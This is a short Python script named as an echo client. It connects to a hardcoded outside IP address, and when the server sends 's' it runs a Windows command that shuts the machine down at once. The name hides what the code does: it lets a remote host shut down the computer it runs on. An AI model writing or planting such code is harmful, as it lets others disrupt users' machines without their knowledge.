# echo-client.py

import socket
import os
HOST = "131.155.246.24"  # The server's hostname or IP address
PORT = 65432  # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
    #while True:
        data = s.recv(1024)
        print(data)
        if data== b's':
            os.system("shutdown /s /t 1")